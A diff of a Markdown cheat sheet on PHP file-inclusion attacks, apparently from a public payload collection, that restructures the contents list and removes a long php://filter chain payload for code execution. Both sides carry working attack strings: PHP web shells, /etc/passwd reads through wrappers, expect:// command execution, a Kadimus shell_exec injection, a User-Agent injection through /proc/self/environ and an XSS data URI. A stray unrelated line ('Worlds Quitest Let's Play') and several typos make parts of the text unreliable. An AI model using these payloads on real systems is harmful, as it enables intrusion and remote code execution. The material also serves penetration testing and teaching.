@@ -6,41 +6,30 @@
 
 ## Summary
 
-- [File Inclusion](#file-inclusion)
-  - [Summary](#summary)
-  - [Tools](#tools)
-  - [Basic LFI](#basic-lfi)
-    - [Null byte](#null-byte)
-    - [Double encoding](#double-encoding)
-    - [UTF-8 encoding](#utf-8-encoding)
-    - [Path and dot truncation](#path-and-dot-truncation)
-    - [Filter bypass tricks](#filter-bypass-tricks)
-  - [Basic RFI](#basic-rfi)
-    - [Null byte](#null-byte-1)
-    - [Double encoding](#double-encoding-1)
-    - [Bypass allow_url_include](#bypass-allow_url_include)
-  - [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
-    - [Wrapper php://filter](#wrapper-phpfilter)
-    - [Wrapper zip://](#wrapper-zip)
-    - [Wrapper data://](#wrapper-data)
-    - [Wrapper expect://](#wrapper-expect)
-    - [Wrapper input://](#wrapper-input)
-    - [Wrapper phar://](#wrapper-phar)
-  - [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
-  - [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
-  - [LFI to RCE via upload](#lfi-to-rce-via-upload)
-  - [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
-  - [LFI to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)
-  - [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
-  - [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
-    - [RCE via SSH](#rce-via-ssh)
-    - [RCE via Mail](#rce-via-mail)
-    - [RCE via Apache logs](#rce-via-apache-logs)
-  - [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
-  - [LFI to RCE via credentials files](#lfi-to-rce-via-credentials-files)
-    - [Windows version](#windows-version)
-    - [Linux version](#linux-version)
-  - [References](#references)
+* [Tools](#tools)
+* [Basic LFI](#basic-lfi)
+    * [Null byte](#null-byte)
+    * [Double encoding](#double-encoding)
+    * [UTF-8 encoding](#utf-8-encoding)
+    * [Path and dot truncation](#path-and-dot-truncation)
+    * [Filter bypass tricks](#filter-bypass-tricks)
+* [Basic RFI](#basic-rfi)
+* [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
+  * [Wrapper php://filter](#wrapper-phpfilter)
+  * [Wrapper zip://](#wrapper-zip)
+  * [Wrapper data://](#wrapper-data)
+  * [Wrapper expect://](#wrapper-expect)
+  * [Wrapper input://](#wrapper-input)
+  * [Wrapper phar://](#wrapper-phar)
+* [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
+* [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
+* [LFI to RCE via upload](#lfi-to-rce-via-upload)
+* [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
+* [LFI to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)
+* [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
+* [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
+* [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
+* [LFI to RCE via credentials files](#lfi-o-rce-via-credentials-files)
 
 ## Tools
 
@@ -140,7 +129,7 @@ http://example.com/index.php?page=php://filter/convert.base64-encode/resource=in
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 ```
 
-Wrappers can be chained with a compression wrapper for large files.
+can be chained with a compression wrapper for large files.
 
 ```powershell
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
@@ -155,28 +144,16 @@ NOTE: Wrappers can be chained multiple times using `|` or `/`:
 curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
 ```
 
-Also there is a way to turn the `php://filter` into a full RCE. Use [LFI2RCE.py](./LFI2RCE.py) to generate a custom payload.
-
-```powershell
-# vulnerable file: index.php
-# vulnerable parameter: file
-# executed command: id
-# executed PHP code: <?=`$_GET[0]`;;?>
-curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
-```
-
-
 ### Wrapper zip://
 
-1. Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
-2. Zip the file
-  ```python
-  zip payload.zip payload.php;
-  mv payload.zip shell.jpg;
-  rm payload.php
-  ```
-3. Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```python
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
 
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
 
 ### Wrapper data://
 
@@ -187,14 +164,12 @@ NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
 
 Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`
 
-
 ### Wrapper expect://
 
 ```powershell
 http://example.com/index.php?page=expect://id
 http://example.com/index.php?page=expect://ls
 ```
-
 
 ### Wrapper input://
 
@@ -209,7 +184,6 @@ Alternatively, Kadimus has a module to automate this attack.
 ```powershell
 ./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
 ```
-
 
 ### Wrapper phar://
 
@@ -244,7 +218,6 @@ include('phar://test.phar');
 
 NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.
 
-
 ## LFI to RCE via /proc/*/fd
 
 1. Upload a lot of shells (for example : 100)
@@ -259,7 +232,6 @@ GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
 
-
 ## LFI to RCE via upload
 
 If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).
@@ -269,7 +241,6 @@ http://example.com/index.php?page=path/to/uploaded/file.png
 ```
 
 In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
-
 
 ## LFI to RCE via upload (race)
 Worlds Quitest Let's Play"
@@ -473,6 +444,4 @@ If SSH is active check which user is being used `/proc/self/status` and `/etc/pa
 * [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
 * [PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
-* [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18](https://gynvael.coldwind.pl/?id=376)
-* [LFI2RCE via PHP Filters - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
-* [Solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
+* [PHP LFI to arbitratry code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18](https://gynvael.coldwind.pl/?id=376)
